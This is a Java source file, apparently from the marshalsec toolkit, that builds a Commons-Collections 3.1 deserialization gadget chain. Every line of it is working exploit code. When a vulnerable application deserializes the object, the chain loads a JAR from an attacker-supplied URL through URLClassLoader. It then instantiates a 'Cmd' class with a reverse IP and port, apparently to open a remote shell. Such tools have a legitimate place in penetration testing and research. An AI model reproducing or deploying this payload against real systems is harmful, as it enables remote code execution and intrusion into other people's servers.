package marshalsec.gadgets;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import marshalsec.UtilFactory;
import marshalsec.util.Gadgets;
import marshalsec.util.JavaVersion;
import marshalsec.util.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

/*
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */

/**
 * commons-collections:commons-collections:3.1
 */
public interface CommonsCollections3ForLoadJar extends Gadget {

  default Object makeCommonsCollections3ForLoadJar(UtilFactory uf, String[] args) throws Exception {
    // http://127.0.0.1:8080/R.jar 127.0.0.1 4444
    String payloadUrl = args[0];

    String ip2 = args[1];
    Integer port2 = Integer.parseInt(args[2]);
    // inert chain for setup
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{new ConstantTransformer(1)});
    // real chain for after setup
    final Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(java.net.URLClassLoader.class),
        // getConstructor class.class classname
        new InvokerTransformer("getConstructor",
            new Class[]{Class[].class},
            new Object[]{new Class[]{java.net.URL[].class}}),
        new InvokerTransformer(
            "newInstance",
            new Class[]{Object[].class},
            new Object[]{new Object[]{new java.net.URL[]{new java.net.URL(
                payloadUrl)}}}),
        // loadClass String.class R
        new InvokerTransformer("loadClass",
            new Class[]{String.class}, new Object[]{"Cmd"}),
        // set the target reverse ip and port
        new InvokerTransformer("getConstructor",
            new Class[]{Class[].class},
            new Object[]{new Class[]{String.class, int.class}}),
        // invoke
        new InvokerTransformer("newInstance",
            new Class[]{Object[].class},
            new Object[]{new Object[]{ip2, port2}}),
        new ConstantTransformer(1)};

    final Map innerMap = new HashMap();

    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

    Reflections.setFieldValue(transformerChain, "iTransformers",
        transformers); // arm with actual transformer chain

    return handler;
  }

  public static boolean isApplicableJavaVersion() {
    return JavaVersion.isAnnInvHUniversalMethodImpl();
  }
}
